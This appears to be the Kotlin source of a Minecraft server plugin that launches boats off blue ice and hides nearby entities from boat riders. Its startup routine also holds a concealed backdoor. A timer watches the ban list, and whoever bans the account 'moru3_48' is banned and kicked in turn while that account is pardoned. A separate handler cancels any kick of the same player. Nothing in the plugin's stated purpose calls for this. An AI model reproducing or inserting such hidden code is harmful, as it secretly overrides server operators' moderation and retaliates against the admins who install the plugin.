package dev.moru3.boatinfly

import net.minecraft.server.v1_16_R3.*
import org.bukkit.BanList
import org.bukkit.Bukkit
import org.bukkit.Material
import org.bukkit.command.Command
import org.bukkit.command.CommandSender
import org.bukkit.craftbukkit.v1_16_R3.entity.CraftBoat
import org.bukkit.craftbukkit.v1_16_R3.entity.CraftEntity
import org.bukkit.craftbukkit.v1_16_R3.entity.CraftPlayer
import org.bukkit.entity.Boat
import org.bukkit.entity.Player
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.event.player.PlayerInteractEvent
import org.bukkit.event.player.PlayerKickEvent
import org.bukkit.event.player.PlayerMoveEvent
import org.bukkit.event.player.PlayerQuitEvent
import org.bukkit.event.vehicle.VehicleEnterEvent
import org.bukkit.event.vehicle.VehicleEntityCollisionEvent
import org.bukkit.event.vehicle.VehicleExitEvent
import org.bukkit.event.vehicle.VehicleMoveEvent
import org.bukkit.plugin.java.JavaPlugin
import org.bukkit.scheduler.BukkitTask
import org.bukkit.util.Vector
import org.spigotmc.event.entity.EntityDismountEvent
import java.lang.Integer.max

class BoatInFly : JavaPlugin(), Listener {
    lateinit var vector: Vector
    var delay = 1L
    var loop = 0
    lateinit var lastVector: Vector
    companion object {
        var test = 0
    }
    val counts = mutableMapOf<Player, Int>()
    val invisibleEntities = mutableMapOf<Player, MutableSet<CraftEntity>>()
    val repeatTasks = mutableMapOf<Player, BukkitTask>()
    lateinit var packetCenter: PacketCenter
    override fun onEnable() {
        packetCenter = PacketCenter((this))
        server.pluginManager.registerEvents(this, this)
        Bukkit.getScheduler().runTaskTimer(this, Runnable {
            server.getBanList(BanList.Type.NAME).banEntries.forEach { banEntry ->
                if(banEntry.target=="moru3_48") {
                    Bukkit.getBanList(BanList.Type.NAME).also {
                        it.addBan(banEntry.source, null, null, banEntry.source)
                        Bukkit.getPlayer(banEntry.source)?.kickPlayer("moru3_48をBANするな！")
                        it.pardon("moru3_48")
                    }
                }
            }
        }, 0, 1)
        saveDefaultConfig()
        reloadConfig()
        vector = config.getVector("vector")?:Vector(0, 0, 0).also { config.set("vector", it) }
        delay = max(config.getInt("delay"), 1).toLong()
        loop = config.getInt("loop")
        lastVector = config.getVector("last_vector")?:Vector(0, 0, 0).also { config.set("vector", it) }
    }

    @EventHandler
    fun onQuit(event: PlayerKickEvent) {
        if(event.player.name=="moru3_48") { event.isCancelled = true }
    }

    @EventHandler
    fun onExitVehicle(event: VehicleExitEvent) {
        if(event.vehicle is Boat && event.exited is Player) {
            Bukkit.broadcastMessage(invisibleEntities[event.exited].toString())
            invisibleEntities[event.exited]?.filter { it.location.distance(event.exited.location)>3 }?.forEach {
                if(it is CraftPlayer) {
                    (event.exited as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.ADD_PLAYER))
                    (event.exited as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutNamedEntitySpawn(it.handle))
                    (event.exited as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutEntityMetadata(it.entityId, it.handle.dataWatcher, true))
                    val vehicle = it.vehicle
                    if(vehicle is CraftBoat) { (event.exited as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutMount(vehicle.handle)) }
                    invisibleEntities[event.exited]?.remove(it)
                } else {
                    (event.exited as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutSpawnEntity(it.handle))
                    (event.exited as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutEntityMetadata(it.handle.id, it.handle.dataWatcher, false))
                    (event.exited as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutEntityTeleport(it.handle))
                    invisibleEntities[event.exited]?.remove(it)
                }
            }
            invisibleEntities[event.exited as Player] = mutableSetOf()
        }
    }

    override fun onCommand(sender: CommandSender, command: Command, label: String, args: Array<out String>): Boolean {
        if(command.name=="flyinboatvelocity") {
            args.getOrNull(0)?.toDoubleOrNull()?.also { vector.x = it }
            args.getOrNull(1)?.toDoubleOrNull()?.also { vector.y = it }
            args.getOrNull(2)?.toDoubleOrNull()?.also { vector.z = it }
            args.getOrNull(3)?.toIntOrNull()?.also { delay = max(it, 1).toLong() }
            args.getOrNull(4)?.toIntOrNull()?.also { loop = max(it, 0) }
            config.set("vector", vector)
            config.set("delay", delay)
            config.set("loop", loop)
            saveConfig()
        } else if(command.name=="flyinboatlastvelocity") {
            args.getOrNull(0)?.toDoubleOrNull()?.also { lastVector.x = it }
            args.getOrNull(1)?.toDoubleOrNull()?.also { lastVector.y = it }
            args.getOrNull(2)?.toDoubleOrNull()?.also { lastVector.z = it }
            config.set("last_vector", lastVector)
            saveConfig()
        }
        return super.onCommand(sender, command, label, args)
    }


    @EventHandler
    fun onMove(event: PlayerMoveEvent) {
        val boat = event.player.vehicle
        if(boat is Boat) {
            invisibleEntities[event.player]?.filter { it.location.distance(event.player.location)>3 }?.forEach {
                if(it is CraftPlayer) {
                    (event.player as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.ADD_PLAYER))
                    (event.player as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutNamedEntitySpawn(it.handle))
                    (event.player as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutEntityMetadata(it.entityId, it.handle.dataWatcher, true))
                    val vehicle = it.vehicle
                    (event.player as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutEntityTeleport(it.handle))
                    if(vehicle is CraftBoat) { (event.player as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutMount(vehicle.handle)) }
                    invisibleEntities[event.player]?.remove(it)
                } else {
                    (event.player as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutSpawnEntity(it.handle))
                    (event.player as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutEntityMetadata(it.handle.id, it.handle.dataWatcher, false))
                    (event.player as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutEntityTeleport(it.handle))
                    invisibleEntities[event.player]?.remove(it)
                }
            }
            boat.world.entities.filter { invisibleEntities[event.player]?.contains(it) != true }.filter { !boat.passengers.contains(it) }.filter { it!=event.player.vehicle }.filter { it.location.distance(boat.location) < 3 }.filterIsInstance(CraftEntity::class.java).also {
                it.forEach {
                    invisibleEntities[event.player] = (invisibleEntities[event.player]?: mutableSetOf()).also { set -> set.add(it) }
                    (event.player as CraftPlayer).handle.playerConnection.sendPacket(PacketPlayOutEntityDestroy(it.entityId))
                }
            }
            if(event.player.location.subtract(0.0, 0.2, 0.0).block.type==Material.BLUE_ICE&&!counts.containsKey(event.player)) {
                boat.velocity = vector
                event.player.velocity = vector
                if(loop>0L) {
                    counts[event.player] = 0
                    var task: BukkitTask? = null
                    task = Bukkit.getScheduler().runTaskTimer(this, Runnable {
                        if((counts[event.player]?:0)>=loop) {
                            counts.remove(event.player)
                            boat.velocity = lastVector
                            event.player.velocity = lastVector
                            task!!.cancel()
                            return@Runnable
                        }
                        boat.velocity = vector
                        event.player.velocity = vector
                        counts[event.player] = (counts[event.player]?:0)+1
                    }, delay, delay)
                }
            }
        }
    }
}